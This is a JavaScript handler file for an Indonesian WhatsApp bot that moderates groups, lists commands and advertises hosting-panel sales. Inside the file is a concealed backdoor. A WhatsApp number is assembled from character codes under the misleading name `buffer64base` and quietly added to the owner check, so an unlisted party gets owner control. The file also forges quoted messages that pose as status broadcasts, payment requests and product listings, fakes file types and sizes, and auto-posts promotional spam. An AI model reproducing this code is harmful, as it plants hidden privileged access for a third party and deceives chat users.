/*

  !- Base By Skyzopedia
  https://wa.me/6287780625347
  
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const didyoumean = require('didyoumean');
const currencyFormatter = require('currency-formatter');
const similarity = require('similarity')
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const seller = JSON.parse(fs.readFileSync("./library/database/seller.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const premium2 = JSON.parse(fs.readFileSync("./library/database/premium2.json"))
const hutangList = JSON.parse(fs.readFileSync("./src/hutang.json", "utf-8") || "[]");
const pendapatanList = JSON.parse(fs.readFileSync("./src/pendapatan.json", "utf-8") || "[]");
const uangkasList = JSON.parse(fs.readFileSync("./src/uangkas.json", "utf-8") || "[]");
const botList = JSON.parse(fs.readFileSync("./src/botlist.json", "utf-8") || "[]");
const adminPanelList = JSON.parse(fs.readFileSync("./src/adplist.json", "utf-8") || "[]");
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { addSaldo, minSaldo, cekSaldo } = require("./library/database/deposit");
let db_saldo = JSON.parse(fs.readFileSync("./library/database/saldo.json"));
const db_user = JSON.parse(fs.readFileSync('./src/user.json'))
const antispam = require("./src/antispam");
const bulan = moment.tz('Asia/Jakarta').format('MM/MMMM')
const tahun = moment.tz('Asia/Jakarta').format('YYYY')
const tanggal2 = moment().tz("Asia/Jakarta").format("dddd, d")
const jam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wibTime = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const config = require('./Security/adiwConfig')
const { checkApproval, approveScript, isApproved, validateApprovalData, checkScriptIntegrity } = require('./Security/adiwajs')
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, jadwalSholat, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');

module.exports = conn = async (conn, m, chatUpdate, store) => {
	try {
await LoadDataBase(conn, m)
const botNumber = await conn.decodeJid(conn.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = /^[>°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[>°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi)[0] : '.'
const isCmd = body.startsWith(prefix)
const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ""
const isCommand2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const command = prefix ? isCommand : isCommand2
const from = m.key.remoteJid
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const isSeller = seller.includes(m.sender)
const isPremium = premium.includes(m.sender)
const isPremium2 = premium2.includes(m.sender)
const ishutangList = hutangList.includes(m.sender)
const ispendapatanList = pendapatanList.includes(m.sender)
const isuangkasList = uangkasList.includes(m.sender)
const isbotList = botList.includes(m.sender)
const isPc = from.endsWith('@s.whatsapp.net')
const isGc = from.endsWith('@g.us')
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const getWaktuWITA = () => {

    return moment().tz("Asia/Makassar").format("YYYY-MM-DD HH:mm:ss");

};

const waktuWITA = getWaktuWITA();

const getWaktuWIT = () => {

    return moment().tz("Asia/Jayapura").format("YYYY-MM-DD HH:mm:ss");

};

const waktuWIT = getWaktuWIT();        
const getWaktuWIB = () => {

    return moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");

};

const waktuWIB = getWaktuWIB();
const jam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z') 
const penghitung = moment().tz("Asia/Jakarta").format("dddd, D MMMM - YYYY")

//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}


//user
let cekUser = (satu, dua) => { 
    let x1 = false;
    Object.keys(db_user).forEach((i) => {
        if (db_user[i].id == dua) { x1 = i }
    });

    if (x1 !== false) {
        if (satu == "id") return db_user[x1].id;
        if (satu == "name") return db_user[x1].name;
        if (satu == "seri") return db_user[x1].seri;
        if (satu == "umur") return db_user[x1].umur;
        if (satu == "premium") return db_user[x1].premium;
    }
    return null;
}

//func makeid
const makeid = () => {
    let result = '';
    const characters = '0123456789';
    for (let i = 0; i < 2; i++) {
        result += characters.charAt(Math.floor(Math.random() * 10));
    }
    return result;
};
//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qtext3 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `Simple Pribadi 𝐒𝐤𝐢𝐳𝐨𝐤𝐞𝐧`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return conn.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await conn.sendMessage(m.chat, {text: `
*々 IjulTaka || 乂 Menyediakan*

*»»—— Vps Digital Ocean ——««*
*» Ram 2 Core 1 : 25K*
*» Ram 2 Core 2 : 30K*
*» Ram 4 Core 2 : 40K*
*» Ram 8 Core 4 : 50K*
*» Ram 16 Core 4 : 65K*

*»»—— Benefit Vps ——««*
*» Free Install Panel*
*» Free Protected Panel [Cf]*
*» Free Req Subdomain*
*» Free Install Wings*
*» Free Egg Bot Wa*
*» Free Install Tema [Ram 8,16]*
*» Garansi 15 Days, 1× Replace*

*»»—— Produk Lainnya ——««*
*» Panel Public 1Gb - Unli*
*» Panel Private 1Gb - Unli*
*» Murid Buat Fitur : 50/45K*
*» Domain my.id .tech dll : 10K*
*» Reseller Subdomain : 15K*
*» Murid Subdomain Full Akses Cf : 15K*
*» Jasa Rename Script: 10K*
*» Jasa Fix Script dll*
*» Reseller Panel Public : 10K*
*» Reseller Panel Private : 15K*
*» Admin Panel : 20K*
*» Pt Panel : 50K*
*» Own Panel : 40K*
*» Sc Wa/Tele*
*» Dll Tanyakan*
*» NOTE: BISA GUNAKAN BOT DARI NO DI BAWAH*

*»»—— Contacts Person ——««*
*Wa :* wa.me/62895373974000
*Tele :* t.me/々 IjulTaka || 乂
*Channel :* https://whatsapp.com/channel/0029VaqgmI2Jf05dg5Fweh0T
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antitagowner === true) {
    // Daftar nomor owner utama
    const ownerNumbers = ["62895373974000"]; // Ganti dengan nomor owner utama
    const mentionedUsers = m.message.extendedTextMessage?.contextInfo?.mentionedJid || [];

    // Cek jika pesan berisi tag ke owner utama
    const isTaggingOwner = mentionedUsers.some(user => ownerNumbers.includes(user.split("@")[0]));

    if (isTaggingOwner && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
        const delet = m.key.participant;
        const bang = m.key.id;

        // Kirim pesan peringatan
        await conn.sendMessage(
            m.chat, 
            {
                text: `*⚠️ [ Tag Owner Terdeteksi ]*\n\n@${m.sender.split("@")[0]} Maaf pesan kamu telah dihapus karena tidak diperbolehkan mengetag nomor owner utama.`,
                mentions: [m.sender]
            }, 
            { quoted: m }
        );

        // Hapus pesan
        await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet } });

        /* Jika ingin mengeluarkan pelanggar, aktifkan kode di bawah ini */
        // await sleep(1000);
        // await Sky.groupParticipantsUpdate(m.chat, [m.sender], "remove");
    }
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].afk === true) {
    // Daftar nomor owner utama
    const ownerNumbers = ["62895373974000"]; // Ganti dengan nomor owner utama
    const mentionedUsers = m.message.extendedTextMessage?.contextInfo?.mentionedJid || [];

    // Cek jika pesan berisi tag ke owner utama
    const isAfkOwner = mentionedUsers.some(user => ownerNumbers.includes(user.split("@")[0]));

    if (isAfkOwner && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
        const delet = m.key.participant;
        const bang = m.key.id;

        // Kirim pesan peringatan
        await conn.sendMessage(
            m.chat, 
            {
                text: `*⚠️ [ Owner Utama Sedang Afk ]*\n\n@${m.sender.split("@")[0]} Maaf pesan kamu telah dihapus, owner kami sedang afk, sedang sibuk mohon tidak men tag owner kami atau mengganggu owner kami.`,
                mentions: [m.sender]
            }, 
            { quoted: m }
        );

        // Hapus pesan
        await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet } });

        /* Jika ingin mengeluarkan pelanggar, aktifkan kode di bawah ini */
        // await sleep(1000);
        // await Sky.groupParticipantsUpdate(m.chat, [m.sender], "remove");
    }
}

if (isCmd && !m.key.fromMe && antispam) {
if (antispam.isFiltered(m.sender)) return m.reply(`*( Anti Spam )* *Jeda 5 Detik.. Anda Dibanned Selama 1 Tahun!!.*`)
antispam.addFilter(m.sender)
}

conn.autoshalat = conn.autoshalat ? conn.autoshalat : {};
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.id : m.sender;
let id = m.chat;

if (id in conn.autoshalat) {
    return false;
}
let jadwalSholat = {
    shubuh: '04:06',
    terbit: '05:44',
    dhuha: '05:55',
    dzuhur: '11:48',
    ashar: '15:16',
    magrib: '17:55',
    isya: '19:10',
};

const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
}));
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;

for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        let caption = `Hai!, kini waktu *${sholat}* telah tiba...\nAmbilah air dan segeralah sholat 😇\n\n*${waktu}*\n_tuk wilayah Bandung dan sekitarnya_`;

        // Menyimpan notifikasi sholat tanpa suara adzan
        conn.autoshalat[id] = [
            m.reply(caption),

            setTimeout(async () => {
                delete conn.autoshalat[m.chat];
            }, 57000)
        ];
    }
}

//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

function monospace(string) {
return '```' + string + '```'
}

function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}


const bannedFile = "./src/banned.json";

// Pastikan file JSON ada, jika tidak buat file baru
if (!fs.existsSync(bannedFile)) {
    fs.writeFileSync(bannedFile, JSON.stringify([]));
}

let bannedUsers = JSON.parse(fs.readFileSync(bannedFile));

// Fungsi untuk mengecek apakah pengguna dibanned
const isBanned = (user) => bannedUsers.includes(user);

// Fungsi untuk menyimpan daftar banned ke file JSON
const saveBannedUsers = () => {
    fs.writeFileSync(bannedFile, JSON.stringify(bannedUsers, null, 2));
};

// ** Middleware untuk memeriksa banned user sebelum menjalankan perintah **
const checkBannedUser = (m, Reply) => {
    if (isBanned(m.sender)) {
        return Reply("Akun Anda sudah dibanned oleh owner kami.");
    }
};

// Middleware digunakan dalam sistem utama sebelum menjalankan perintah
if (isBanned(m.sender)) {
    return m.reply("Akun Anda sudah dibanned oleh owner kami.");
}


async function loading() {
  const rafacode = [
    "_⌛ 10%_",
    "_⌛ 35%_",
    "_⌛ 55%_",
    "_⌛ 75%_",
    "_⌛ 100%_",
    "_👋 Hallo, My Name Is 々 IjulTaka || 乂_",
    "_📝 Script By: 々 IjulTaka || 乂_",
    "_🕊️ Thank You For Waiting... Please Be Patient..._",
  ];

  // Sending the initial "Loading..." message with emoji
  const { key } = await conn.sendMessage(
    m.chat,
    { text: "🌀 Loading... Please wait a moment ⏳" },
    { quoted: qtext }
  );

  // Displaying each message one by one with a delay
  for (const message of rafacode) {
    await sleep(100); // Waiting for 100ms
    await conn.sendMessage(
      m.chat,
      { text: message, edit: key },
      { quoted: qtext }
    );
  }
}        

async function connectToWhatsApp() {
    if (!(await isApproved())) {
        if (m.sender.includes(config.approval.num) && budy.includes(config.approval.text)) {
            await approveScript(m.sender, conn.authState.creds.pairingCode);
            await m.reply(config.approval.greet);
        } else {
            await checkApproval();
        }
    }
}

connectToWhatsApp();
if (!await isApproved() && isCmd) {
    return;
}
checkScriptIntegrity();
if (await isApproved()) {
    validateApprovalData(conn.authState.creds.pairingCode);
} 
if (!fs.existsSync('./Security/approval')) {
conn.sendMessage(config.approval.num + '@s.whatsapp.net', { text: 'Hallo ❀ 𝘙𝘢𝘧𝘢𝘵𝘩𝘢𝘳𝘊𝘰𝘥𝘦444 𝘋𝘦𝘷, Saya Membutuhkan Akses Vip Untuk Mengakses Bot!!!' })
    
fs.writeFileSync('./Security/approval', '', 'utf8');
}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
try {
const data = fs.readFileSync('sikima.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `𝚆𝚛𝚘𝚗𝚐 𝙲𝚘𝚖𝚖𝚊𝚗𝚍, 𝚃𝚑𝚒𝚜 𝚒𝚜 𝙲𝚘𝚛𝚛𝚎𝚌𝚝 𝙲𝚖𝚍:\n⇝ ${prefix+mean}\n\⇝ Kᴇᴍɪʀɪᴘᴀɴ: ${similarityPercentage}%`
m.reply(response)
}}

const totalFitur = () =>{
var mytext = fs.readFileSync("sikima.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
}

async function quickreply1(chat, teks, quick1, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": quick1
}
],
})})
}}
}, { quoted: jm }) //ori (floc)

await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: conn.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*RapszioOffc* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*RapszioOffc Menyediakan 🌟*

* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup  Bebas Promosi 1 :*
https://chat.whatsapp.com/BNrO2WHYBlD251ZhOuqDbz
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp3000

* Ram 2 GB : Rp4000

* Ram 3 GB : Rp5000

* Ram 4 GB : Rp6000

* Ram 5 GB : Rp7000

* Ram 6 GB : Rp8000

* Ram 7 GB : Rp9000

* Ram 8 GB : Rp10000

* Ram 9 GB : Rp11000

* Ram Unlimited : Rp15.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await conn.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}
//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
case 'help': {
let teksnya = `█▀▀▄ ▄▀▄ █▀ ▄▀▄ ▀█▀ █░█ ▄▀▄
█▐█▀ █▀█ █▀ █▀█ ░█░ █▀█ █▀█
▀░▀▀ ▀░▀ ▀░ ▀░▀ ░▀░ ▀░▀ ▀░▀
█▀▀▄
█▐█▀
▀░▀▀
Haii @${m.sender.split("@")[0]},
Perkenalkan, saya adalah *${global.botname2}*.

Keunggulan Layanan CS Kami:
✅ Cepat & Responsif – Waktu tanggapan yang optimal untuk kepuasan pelanggan.
✅ Profesional & Ramah – Pelayanan dilakukan dengan etika komunikasi yang baik.
✅ Solusi yang Efektif – Penyelesaian masalah secara tepat dan efisien.
✅ Dukungan Berkelanjutan – Pelanggan dapat terus memperoleh bantuan kapan pun diperlukan.

Hubungi CS KAMI
wa.me/62895373974000

*#Jika ingin membeli produk silakan hubungi admin kami*
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.menu`,
      buttonText: { displayText: 'Menu' },
      type: 1
    },
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'All Menu' },
      type: 1
    },
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Hubungi Developer' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'menu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
    const infoMessage = `
▧ I N F O R M A T I O N
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()} 

• Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
    `;

    await conn.sendMessage(m.chat, {
        footer: `© 2025 ${global.botname2}`,
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: 'Pilih Menu Lain' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Pilih Menu yang Tersedia',
                        sections: [
                            {
                                title: 'List Menu Simple Bot',
                                rows: [
                                    { title: "ScriptFree 🆓", id: ".scfree", description: "Menampilkan script gratisan dengan kualitas premium." },
                                    { title: "Newmenu 🔄", id: ".newmenu", description: "Menampilkan menu terbaru yang telah ditambahkan." },
                                    { title: "Catatatmenu 📝", id: ".catatatmenu", description: "Menyediakan fitur pencatatan dan pengelolaan data." },
                                    { title: "Othermenu 🔎", id: ".othermenu", description: "Kumpulan menu tambahan dengan berbagai fungsi lainnya." },
                                    { title: "Searchmenu 🔍", id: ".searchmenu", description: "Membantu melakukan pencarian data dan informasi dengan cepat." },
                                    { title: "Toolsmenu 🔧", id: ".toolsmenu", description: "Kumpulan alat bantu untuk berbagai kebutuhan teknis." },
                                    { title: "Otomatismenu 🤖", id: ".otomatismenu", description: "Fitur otomatisasi untuk meningkatkan efisiensi pekerjaan." },
                                    { title: "Shopmenu 🛒", id: ".shopmenu", description: "Menampilkan daftar produk yang tersedia untuk dibeli." },
                                    { title: "Downloadmenu 📥", id: ".downloadmenu", description: "Menyediakan tautan untuk mengunduh berbagai file dan aplikasi." },
